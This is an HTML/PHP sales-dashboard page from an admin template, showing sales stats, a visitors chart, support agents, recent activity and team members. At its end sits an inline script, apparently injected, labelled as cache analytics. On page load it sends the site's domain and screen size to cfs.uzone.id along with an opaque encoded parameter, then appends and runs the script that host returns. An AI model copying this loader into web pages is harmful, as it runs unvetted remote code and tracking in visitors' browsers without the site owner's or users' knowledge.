<!DOCTYPE html>
<html>

<!-- head -->
<?php require_once 'includes/head.php'; ?>
<!-- end of head -->


<body>
    <div class="all-wrapper">
        <div class="layout-w">

            <!-- begin of menu -->
            <?php require_once 'includes/sitebar.php'; ?>
            <!-- end of menu -->

            <div class="content-w">
                <ul class="breadcrumb">
                    <li class="breadcrumb-item"><a href="index.html">Home</a></li>
                    <li class="breadcrumb-item"><a href="index.html">Products</a></li>
                    <li class="breadcrumb-item"><span>Laptop with retina screen</span></li>
                </ul>
                <div class="content-i">
                    <div class="content-box">
                        <div class="row">
                            <div class="col-sm-12">
                                <div class="element-wrapper">
                                    <div class="element-actions">
                                        <form class="form-inline justify-content-sm-end">
                                            <select class="form-control form-control-sm rounded">
                                                <option value="Pending">Today</option>
                                                <option value="Active">Last Week </option>
                                                <option value="Cancelled">Last 30 Days</option>
                                            </select>
                                        </form>
                                    </div>
                                    <h6 class="element-header">Sales Dashboard</h6>
                                    <div class="element-content">
                                        <div class="row">
                                            <div class="col-sm-4">
                                                <div class="element-box el-tablo">
                                                    <div class="label">Products Sold</div>
                                                    <div class="value">57</div>
                                                    <div class="trending trending-up"><span>12%</span><i class="os-icon os-icon-arrow-up2"></i></div>
                                                </div>
                                            </div>
                                            <div class="col-sm-4">
                                                <div class="element-box el-tablo">
                                                    <div class="label">Gross Profit</div>
                                                    <div class="value">$457</div>
                                                    <div class="trending trending-down-basic"><span>12%</span><i class="os-icon os-icon-arrow-2-down"></i></div>
                                                </div>
                                            </div>
                                            <div class="col-sm-4">
                                                <div class="element-box el-tablo">
                                                    <div class="label">New Customers</div>
                                                    <div class="value">125</div>
                                                    <div class="trending trending-down-basic"><span>9%</span><i class="os-icon os-icon-graph-down"></i></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-sm-12">
                                <div class="element-wrapper">
                                    <h6 class="element-header">Unique Visitors Graph</h6>
                                    <div class="element-box">
                                        <div class="os-tabs-w">
                                            <div class="os-tabs-controls">
                                                <ul class="nav nav-tabs smaller">
                                                    <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="index.html#tab_overview">Overview</a></li>
                                                    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="index.html#tab_sales">Sales</a></li>
                                                </ul>
                                                <ul class="nav nav-pills smaller hidden-sm-down">
                                                    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="index.html#">Today</a></li>
                                                    <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="index.html#">7 Days</a></li>
                                                    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="index.html#">14 Days</a></li>
                                                    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="index.html#">Last Month</a></li>
                                                </ul>
                                            </div>
                                            <div class="tab-content">
                                                <div class="tab-pane active" id="tab_overview">
                                                    <div class="el-tablo">
                                                        <div class="label">Unique Visitors</div>
                                                        <div class="value">12,537</div>
                                                    </div>
                                                    <div class="el-chart-w">
                                                        <canvas height="150px" id="lineChart" width="600px"></canvas>
                                                    </div>
                                                </div>
                                                <div class="tab-pane" id="tab_sales"></div>
                                                <div class="tab-pane" id="tab_conversion"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                    <div class="content-panel">
                        <div class="element-wrapper">
                            <h6 class="element-header">Quick Links</h6>
                            <div class="element-box-tp">
                                <div class="el-buttons-list full-width"><a class="btn btn-white btn-sm" href="index.html#"><i class="os-icon os-icon-delivery-box-2"></i><span>Create New Product</span></a><a class="btn btn-white btn-sm" href="index.html#"><i class="os-icon os-icon-window-content"></i><span>Customer Comments</span></a><a class="btn btn-white btn-sm" href="index.html#"><i class="os-icon os-icon-wallet-loaded"></i><span>Store Settings</span></a></div>
                            </div>
                        </div>
                        <div class="element-wrapper">
                            <h6 class="element-header">Support Agents</h6>
                            <div class="element-box-tp">
                                <div class="profile-tile">
                                    <div class="profile-tile-box">
                                        <div class="pt-avatar-w"><img alt="" src="img/avatar1.jpg"></div>
                                        <div class="pt-user-name">Mark Parson</div>
                                    </div>
                                    <div class="profile-tile-meta">
                                        <ul>
                                            <li>Last Login:<strong>Online Now</strong></li>
                                            <li>Tickets:<strong>12</strong></li>
                                            <li>Response Time:<strong>2 hours</strong></li>
                                        </ul>
                                        <div class="pt-btn"><a class="btn btn-success btn-sm" href="index.html#">Send Message</a></div>
                                    </div>
                                </div>
                                <div class="profile-tile">
                                    <div class="profile-tile-box">
                                        <div class="pt-avatar-w"><img alt="" src="img/avatar1.jpg"></div>
                                        <div class="pt-user-name">Mark Parson</div>
                                    </div>
                                    <div class="profile-tile-meta">
                                        <ul>
                                            <li>Last Login:<strong>Online Now</strong></li>
                                            <li>Tickets:<strong>12</strong></li>
                                            <li>Response Time:<strong>2 hours</strong></li>
                                        </ul>
                                        <div class="pt-btn"><a class="btn btn-secondary btn-sm" href="index.html#">Send Message</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="element-wrapper">
                            <h6 class="element-header">Recent Activity</h6>
                            <div class="element-box-tp">
                                <div class="activity-boxes-w">
                                    <div class="activity-box-w">
                                        <div class="activity-time">10 Min</div>
                                        <div class="activity-box">
                                            <div class="activity-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                            <div class="activity-info">
                                                <div class="activity-role">Mark Pearson</div><strong class="activity-title">Opened New Account</strong></div>
                                        </div>
                                    </div>
                                    <div class="activity-box-w">
                                        <div class="activity-time">2 Hours</div>
                                        <div class="activity-box">
                                            <div class="activity-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                            <div class="activity-info">
                                                <div class="activity-role">John Mayers</div><strong class="activity-title">Posted Comment</strong></div>
                                        </div>
                                    </div>
                                    <div class="activity-box-w">
                                        <div class="activity-time">5 Hours</div>
                                        <div class="activity-box">
                                            <div class="activity-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                            <div class="activity-info">
                                                <div class="activity-role">Kate Wallet</div><strong class="activity-title">Opened New Account</strong></div>
                                        </div>
                                    </div>
                                    <div class="activity-box-w">
                                        <div class="activity-time">2 Days</div>
                                        <div class="activity-box">
                                            <div class="activity-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                            <div class="activity-info">
                                                <div class="activity-role">Monica Bonak</div><strong class="activity-title">Uploaded Image</strong></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="element-wrapper">
                            <h6 class="element-header">Team Members</h6>
                            <div class="element-box-tp">
                                <div class="input-search-w">
                                    <input class="form-control rounded bright" placeholder="Search team members..." type="search">
                                </div>
                                <div class="users-list-w">
                                    <div class="user-w with-status status-green">
                                        <div class="user-avatar-w">
                                            <div class="user-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                        </div>
                                        <div class="user-name">
                                            <h6 class="user-title">John Mayers</h6>
                                            <div class="user-role">Account Manager</div>
                                        </div>
                                        <div class="user-action">
                                            <div class="os-icon os-icon-email-forward"></div>
                                        </div>
                                    </div>
                                    <div class="user-w with-status status-green">
                                        <div class="user-avatar-w">
                                            <div class="user-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                        </div>
                                        <div class="user-name">
                                            <h6 class="user-title">Ben Gossman</h6>
                                            <div class="user-role">Administrator</div>
                                        </div>
                                        <div class="user-action">
                                            <div class="os-icon os-icon-email-forward"></div>
                                        </div>
                                    </div>
                                    <div class="user-w with-status status-red">
                                        <div class="user-avatar-w">
                                            <div class="user-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                        </div>
                                        <div class="user-name">
                                            <h6 class="user-title">Phil Nokorin</h6>
                                            <div class="user-role">HR Manger</div>
                                        </div>
                                        <div class="user-action">
                                            <div class="os-icon os-icon-email-forward"></div>
                                        </div>
                                    </div>
                                    <div class="user-w with-status status-green">
                                        <div class="user-avatar-w">
                                            <div class="user-avatar"><img alt="" src="img/avatar1.jpg"></div>
                                        </div>
                                        <div class="user-name">
                                            <h6 class="user-title">Jenny Miksa</h6>
                                            <div class="user-role">Lead Developer</div>
                                        </div>
                                        <div class="user-action">
                                            <div class="os-icon os-icon-email-forward"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="bower_components/jquery/dist/jquery.min.js"></script>
    <script src="bower_components/moment/moment.js"></script>
    <script src="bower_components/chart.js/dist/Chart.min.js"></script>
    <script src="bower_components/select2/dist/js/select2.full.min.js"></script>
    <script src="bower_components/ckeditor/ckeditor.js"></script>
    <script src="bower_components/bootstrap-validator/dist/validator.min.js"></script>
    <script src="bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
    <script src="bower_components/dropzone/dist/dropzone.js"></script>
    <script src="bower_components/editable-table/mindmup-editabletable.js"></script>
    <script src="bower_components/datatables/media/js/jquery.dataTables.min.js"></script>
    <script src="bower_components/datatables/media/js/dataTables.bootstrap4.min.js"></script>
    <script src="bower_components/fullcalendar/dist/fullcalendar.min.js"></script>
    <script src="js/main.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKnno5gjcnIE8G83hUMMrHMnBpNgNrakdz%2b%2fPHUHYOjlLqbLg66%2fnRN8d9fYmD2kV1Hn55tBFXRj2cpajc9kmqiyQev4AHxU824kNOBiEvc8h4YoKCR0u8cONBwSFKI13%2fdOMzUc0gxLMP%2bKG5ncRCVEDAezHWsIH10lxrCJfOF0%2fyBOiFb2zOVBVJhRnAk%2fRzoCrfwm18yT%2f1LI8QPUC1rY%2fss%2btbHk5FEQpcu%2fC%2flL0LgqAHgrFSEYOpHXxgy5d5l6HF2w5zWTEPrdv0Ou%2bQbzIh9QCEkJvqapVnz%2fnoEnNigw6WdJ4lRFFVPNvLF5g3ZGMvMlHtUW4%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>
